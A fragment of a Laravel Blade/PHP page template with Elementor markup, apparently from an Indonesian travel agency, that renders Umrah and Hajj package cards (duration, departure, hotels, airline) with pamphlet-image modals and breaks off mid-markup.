<div class="elementor-element elementor-element-83103f6 e-flex e-con-boxed e-con" data-id="83103f6" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-00e4e6e elementor-view-default elementor-widget elementor-widget-icon" data-id="00e4e6e" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-f34998e elementor-widget elementor-widget-heading" data-id="f34998e" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Program</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-4d932f7 elementor-widget elementor-widget-text-editor" data-id="4d932f7" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_umrohReguler['program']; ?> Hari</p></div></div>
</div></div>
<div class="elementor-element elementor-element-5c459dc e-flex e-con-boxed e-con" data-id="5c459dc" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-92d6050 e-flex e-con-boxed e-con" data-id="92d6050" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-b5e29ef elementor-view-default elementor-widget elementor-widget-icon" data-id="b5e29ef" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="far fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-674ec1c elementor-widget elementor-widget-heading" data-id="674ec1c" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Keberangkatan</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-536a12f elementor-widget elementor-widget-text-editor" data-id="536a12f" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_umrohReguler['tanggal_mulai']; ?></p></div></div>
</div></div>
<div class="elementor-element elementor-element-65f6a8a e-flex e-con-boxed e-con" data-id="65f6a8a" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-2554282 e-flex e-con-boxed e-con" data-id="2554282" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-73f83a6 elementor-view-default elementor-widget elementor-widget-icon" data-id="73f83a6" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-hotel"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-c0532f2 elementor-widget elementor-widget-heading" data-id="c0532f2" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Hotel</h2></div></div>
<div class="elementor-element elementor-element-87664e6 elementor-view-default elementor-widget elementor-widget-icon" data-id="87664e6" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-star"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-4d17a01 elementor-widget elementor-widget-heading" data-id="4d17a01" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">4+</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-bdf70ae elementor-widget elementor-widget-text-editor" data-id="bdf70ae" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container">
<?php $hotels = explode(";",$get_umrohReguler['list_hotel']);
$i = 1;
foreach ($hotels as $key) {
    if($i>1){
        echo '<p style="margin-top:-3vh">'.$key.'</p>';
    }else {
        echo '<p>'.$key.'</p>';
    }
    $i++;
}
?> </div></div>
{{-- <div class="elementor-element elementor-element-2eb139b elementor-widget elementor-widget-text-editor" data-id="2eb139b" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Madinah : Concorde Dar Al Khair / setaraf</p></div></div> --}}
</div></div>
<div class="elementor-element elementor-element-4239c9a e-flex e-con-boxed e-con" data-id="4239c9a" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-a55cb59 e-flex e-con-boxed e-con" data-id="a55cb59" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-7b9ff33 elementor-view-default elementor-widget elementor-widget-icon" data-id="7b9ff33" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-plane"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-073fadb elementor-widget elementor-widget-heading" data-id="073fadb" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Maskapai</h2></div></div>
</div></div>

{{-- modal --}}
<div class="modal fade" id="modalReguler" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="margin-top:260px; padding-top:260px;
z-index:99;">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h1 class="modal-title fs-5" id="exampleModalLabel">Umroh Reguler</h1>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
            <img src="{{ asset($get_umrohReguler['path_gambar_pamflet'])}}">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <script>
    function hapusBackdrop2() {
        const backdrop = document.querySelector('.modal-backdrop');
        if (backdrop) {
            backdrop.parentNode.removeChild(backdrop); // Menghapus elemen modal-backdrop
        }
    }
</script>
{{-- akhir modal --}}


<div class="elementor-element elementor-element-ceda5b6 elementor-widget elementor-widget-text-editor" data-id="ceda5b6" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container">
    <?php

    if(strpos($get_umrohReguler['maskapai'],";")==null){
echo $get_umrohReguler['maskapai'];
}else{

$maskapai = explode(";",$get_umrohReguler['maskapai']);
    echo '<p>';
    $c = 1;
    $total_maskapai = count($maskapai);
    foreach ($maskapai as $key) {
        if($c == $total_maskapai){
           echo $key;
        }else{
           echo  $key.'</br>';
        }
        $c++;
    }
    echo '</p>';

}
    ?>
</div></div>
</div></div>
</div></div>
<div class="elementor-element elementor-element-f8120ec elementor-align-center elementor-widget elementor-widget-button" data-id="f8120ec" data-element_type="widget" data-widget_type="button.default"><div class="elementor-widget-container"><div class="elementor-button-wrapper">
<a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-grow" href="#" data-bs-toggle="modal" data-bs-target="#modalReguler" onclick="hapusBackdrop2()">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-text">Detail Paket</span>
</span>
</a>





</div></div></div>
</div></div>







<div class="elementor-element elementor-element-9323467 e-flex e-con-boxed e-con" data-id="9323467" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-5763927 elementor-widget elementor-widget-image" data-id="5763927" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2ODMiIGhlaWdodD0iMTAyNCIgdmlld0JveD0iMCAwIDY4MyAxMDI0Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBzdHlsZT0iZmlsbDojY2ZkNGRiO2ZpbGwtb3BhY2l0eTogMC4xOyIvPjwvc3ZnPg==" decoding="async" width="683" height="1024" data-src="{{ asset('/wp-content/uploads/2023/10/IMG_3331-683x1024.jpg') }}" class="attachment-large size-large wp-image-1561" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/IMG_3331-683x1024.jpg') }} 683w, {{ asset('/wp-content/uploads/2023/10/IMG_3331-200x300.jpg') }} 200w, {{ asset('/wp-content/uploads/2023/10/IMG_3331-768x1152.jpg') }} 768w, {{ asset('/wp-content/uploads/2023/10/IMG_3331.jpg') }} 1000w" data-sizes="(max-width: 683px) 100vw, 683px">
</div></div>
<div class="elementor-element elementor-element-f6f35a6 elementor-widget elementor-widget-heading" data-id="f6f35a6" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Umroh <br>Arbain</h2></div></div>
<div class="elementor-element elementor-element-e32dca8 e-flex e-con-boxed e-con" data-id="e32dca8" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-4ab410b e-flex e-con-boxed e-con" data-id="4ab410b" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-1a2ded6 e-flex e-con-boxed e-con" data-id="1a2ded6" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-b17ce5c elementor-view-default elementor-widget elementor-widget-icon" data-id="b17ce5c" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-84781a5 elementor-widget elementor-widget-heading" data-id="84781a5" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Program</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-461edee elementor-widget elementor-widget-text-editor" data-id="461edee" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_umrohArbain['program']; ?> Hari</p></div></div>
</div></div>
<div class="elementor-element elementor-element-e44ca44 e-flex e-con-boxed e-con" data-id="e44ca44" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-7067eba e-flex e-con-boxed e-con" data-id="7067eba" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-0e5b813 elementor-view-default elementor-widget elementor-widget-icon" data-id="0e5b813" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="far fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-6898822 elementor-widget elementor-widget-heading" data-id="6898822" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Keberangkatan</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-8d576bd elementor-widget elementor-widget-text-editor" data-id="8d576bd" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_umrohArbain['tanggal_mulai']; ?></p></div></div>
</div></div>
<div class="elementor-element elementor-element-124ab5e e-flex e-con-boxed e-con" data-id="124ab5e" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-e5a41ef e-flex e-con-boxed e-con" data-id="e5a41ef" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-36fc478 elementor-view-default elementor-widget elementor-widget-icon" data-id="36fc478" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-hotel"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-1680d58 elementor-widget elementor-widget-heading" data-id="1680d58" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Hotel</h2></div></div>
<div class="elementor-element elementor-element-2acaa61 elementor-view-default elementor-widget elementor-widget-icon" data-id="2acaa61" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-star"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-13a2945 elementor-widget elementor-widget-heading" data-id="13a2945" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">4+</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-ad309f2 elementor-widget elementor-widget-text-editor" data-id="ad309f2" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container">
    <?php $hotels = explode(";",$get_umrohArbain['list_hotel']);
    $i = 1;
    foreach ($hotels as $key) {
        if($i>1){
            echo '<p style="margin-top:-3vh">'.$key.'</p>';
        }else {
            echo '<p>'.$key.'</p>';
        }
        $i++;
    }
    ?>
</div></div>
</div></div>
<div class="elementor-element elementor-element-a3d75fe e-flex e-con-boxed e-con" data-id="a3d75fe" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-bb95cbc e-flex e-con-boxed e-con" data-id="bb95cbc" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-2fa2ba6 elementor-view-default elementor-widget elementor-widget-icon" data-id="2fa2ba6" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-plane"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-9c5b521 elementor-widget elementor-widget-heading" data-id="9c5b521" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Maskapai</h2></div></div>
</div></div>

{{-- modal --}}
<div class="modal fade" id="modalArabain" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="margin-top:260px; padding-top:260px;
z-index:99;">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h1 class="modal-title fs-5" id="exampleModalLabel">Umroh Arbain</h1>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
            <img src="{{ asset($get_umrohArbain['path_gambar_pamflet'])}}">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <script>
    function hapusBackdrop3() {
        const backdrop = document.querySelector('.modal-backdrop');
        if (backdrop) {
            backdrop.parentNode.removeChild(backdrop); // Menghapus elemen modal-backdrop
        }
    }
</script>
{{-- akhir modal --}}


<div class="elementor-element elementor-element-2b58f93 elementor-widget elementor-widget-text-editor" data-id="2b58f93" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container">
    <?php

    if(strpos($get_umrohArbain['maskapai'],";")==null){
echo $get_umrohArbain['maskapai'];
}else{

$maskapai = explode(";",$get_umrohArbain['maskapai']);
    echo '<p>';
    $c = 1;
    $total_maskapai = count($maskapai);
    foreach ($maskapai as $key) {
        if($c == $total_maskapai){
           echo $key;
        }else{
           echo  $key.'</br>';
        }
        $c++;
    }
    echo '</p>';

}
    ?>
</div></div>
</div></div>
</div></div>
<div class="elementor-element elementor-element-4be6e7b elementor-align-center elementor-widget elementor-widget-button" data-id="4be6e7b" data-element_type="widget" data-widget_type="button.default"><div class="elementor-widget-container"><div class="elementor-button-wrapper">
<a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-grow" href="#" data-bs-toggle="modal" data-bs-target="#modalArabain" onclick="hapusBackdrop3()">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-text">Detail Paket</span>
</span>
</a>
</div></div></div>
</div></div>
<div class="elementor-element elementor-element-c810c27 e-flex e-con-boxed e-con" data-id="c810c27" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-c7b9748 elementor-widget elementor-widget-image" data-id="c7b9748" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3MzYiIGhlaWdodD0iOTYzIiB2aWV3Qm94PSIwIDAgNzM2IDk2MyI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6I2NmZDRkYjtmaWxsLW9wYWNpdHk6IDAuMTsiLz48L3N2Zz4=" decoding="async" width="736" height="963" data-src="{{ asset('/wp-content/uploads/2023/10/IMG_3362.jpg') }}" class="attachment-large size-large wp-image-1560" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/IMG_3362.jpg') }} 736w, {{ asset('/wp-content/uploads/2023/10/IMG_3362-229x300.jpg') }} 229w" data-sizes="(max-width: 736px) 100vw, 736px">
</div></div>
<div class="elementor-element elementor-element-dd87b1a elementor-widget elementor-widget-heading" data-id="dd87b1a" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Umroh<br>Plus Turkiye</h2></div></div>
<div class="elementor-element elementor-element-84f7af3 e-flex e-con-boxed e-con" data-id="84f7af3" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-76b8a05 e-flex e-con-boxed e-con" data-id="76b8a05" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-6a77c13 e-flex e-con-boxed e-con" data-id="6a77c13" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-446576b elementor-view-default elementor-widget elementor-widget-icon" data-id="446576b" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-41c486d elementor-widget elementor-widget-heading" data-id="41c486d" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Program</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-03cd360 elementor-widget elementor-widget-text-editor" data-id="03cd360" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_umrohPlusTurkiye['program']; ?> Hari</p></div></div>
</div></div>
<div class="elementor-element elementor-element-529ba02 e-flex e-con-boxed e-con" data-id="529ba02" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-f0ae5b4 e-flex e-con-boxed e-con" data-id="f0ae5b4" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-a2b3640 elementor-view-default elementor-widget elementor-widget-icon" data-id="a2b3640" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="far fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-717e084 elementor-widget elementor-widget-heading" data-id="717e084" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Keberangkatan</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-18683b9 elementor-widget elementor-widget-text-editor" data-id="18683b9" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_umrohPlusTurkiye['tanggal_mulai'];?></p></div></div>
</div></div>
<div class="elementor-element elementor-element-e8b4f70 e-flex e-con-boxed e-con" data-id="e8b4f70" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-d50ad44 e-flex e-con-boxed e-con" data-id="d50ad44" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-94f4df5 elementor-view-default elementor-widget elementor-widget-icon" data-id="94f4df5" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-hotel"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-0a9f829 elementor-widget elementor-widget-heading" data-id="0a9f829" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Hotel</h2></div></div>
<div class="elementor-element elementor-element-2d1622c elementor-view-default elementor-widget elementor-widget-icon" data-id="2d1622c" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-star"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-1a187f1 elementor-widget elementor-widget-heading" data-id="1a187f1" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">4+</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-e3013fa elementor-widget elementor-widget-text-editor" data-id="e3013fa" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container">

    <?php $hotels = explode(";",$get_umrohPlusTurkiye['list_hotel']);
    $i = 1;
    foreach ($hotels as $key) {
        if($i>1){
            echo '<p style="margin-top:-3vh">'.$key.'</p>';
        }else {
            echo '<p>'.$key.'</p>';
        }
        $i++;
    }
    ?>

</div></div>

</div></div>
<div class="elementor-element elementor-element-c8c1763 e-flex e-con-boxed e-con" data-id="c8c1763" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-41c4937 e-flex e-con-boxed e-con" data-id="41c4937" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-302ebf7 elementor-view-default elementor-widget elementor-widget-icon" data-id="302ebf7" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-plane"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-c1c2b56 elementor-widget elementor-widget-heading" data-id="c1c2b56" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Maskapai</h2></div></div>
</div></div>

{{-- modal --}}
<div class="modal fade" id="modalPlusTurkiye" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="margin-top:260px; padding-top:260px;
z-index:99;">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h1 class="modal-title fs-5" id="exampleModalLabel">Umroh Plus Turkiye</h1>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
            <img src="{{ asset($get_umrohPlusTurkiye['path_gambar_pamflet'])}}">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <script>
    function hapusBackdrop4() {
        const backdrop = document.querySelector('.modal-backdrop');
        if (backdrop) {
            backdrop.parentNode.removeChild(backdrop); // Menghapus elemen modal-backdrop
        }
    }
</script>
{{-- akhir modal --}}

<div class="elementor-element elementor-element-d8ed2e5 elementor-widget elementor-widget-text-editor" data-id="d8ed2e5" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>
    <?php

    if(strpos($get_umrohPlusTurkiye['maskapai'],";")==null){
echo $get_umrohPlusTurkiye['maskapai'];
}else{

$maskapai = explode(";",$get_umrohPlusTurkiye['maskapai']);
    echo '<p>';
    $c = 1;
    $total_maskapai = count($maskapai);
    foreach ($maskapai as $key) {
        if($c == $total_maskapai){
           echo $key;
        }else{
           echo  $key.'</br>';
        }
        $c++;
    }
    echo '</p>';

}
    ?>
</p></div></div>
</div></div>
</div></div>
<div class="elementor-element elementor-element-460ef6a elementor-align-center elementor-widget elementor-widget-button" data-id="460ef6a" data-element_type="widget" data-widget_type="button.default"><div class="elementor-widget-container"><div class="elementor-button-wrapper">
<a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-grow" href="#" data-bs-toggle="modal" data-bs-target="#modalPlusTurkiye" onclick="hapusBackdrop4()">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-text">Detail Paket</span>
</span>
</a>
</div></div></div>
</div></div>
<div class="elementor-element elementor-element-f742929 e-flex e-con-boxed e-con" data-id="f742929" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-e018791 elementor-widget elementor-widget-image" data-id="e018791" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMTY5IiB2aWV3Qm94PSIwIDAgMzAwIDE2OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6I2NmZDRkYjtmaWxsLW9wYWNpdHk6IDAuMTsiLz48L3N2Zz4=" decoding="async" width="300" height="169" data-src="{{ asset('/wp-content/uploads/2023/10/IMG_3414-300x169.jpg') }}" class="attachment-medium size-medium wp-image-1559" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/IMG_3414-300x169.jpg') }} 300w, {{ asset('/wp-content/uploads/2023/10/IMG_3414.jpg') }} 738w" data-sizes="(max-width: 300px) 100vw, 300px">
</div></div>
<div class="elementor-element elementor-element-0a19ce3 elementor-widget elementor-widget-heading" data-id="0a19ce3" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Haji<br>Furodah</h2></div></div>
<div class="elementor-element elementor-element-9d92dee e-flex e-con-boxed e-con" data-id="9d92dee" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-7a647fd e-flex e-con-boxed e-con" data-id="7a647fd" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-4550114 e-flex e-con-boxed e-con" data-id="4550114" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-a20e513 elementor-view-default elementor-widget elementor-widget-icon" data-id="a20e513" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-c13a244 elementor-widget elementor-widget-heading" data-id="c13a244" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Program</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-1e71c0f elementor-widget elementor-widget-text-editor" data-id="1e71c0f" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_hajiFurodah['program']; ?> Hari</p></div></div>
</div></div>
<div class="elementor-element elementor-element-10ade59 e-flex e-con-boxed e-con" data-id="10ade59" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-e9edb7c e-flex e-con-boxed e-con" data-id="e9edb7c" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-3d5c518 elementor-view-default elementor-widget elementor-widget-icon" data-id="3d5c518" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="far fa-calendar-alt"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-bcfca8d elementor-widget elementor-widget-heading" data-id="bcfca8d" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Keberangkatan</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-e6359ec elementor-widget elementor-widget-text-editor" data-id="e6359ec" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p><?php echo $get_hajiFurodah['tanggal_mulai']; ?></p></div></div>
</div></div>
<div class="elementor-element elementor-element-95a63b9 e-flex e-con-boxed e-con" data-id="95a63b9" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-e4eeb32 e-flex e-con-boxed e-con" data-id="e4eeb32" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
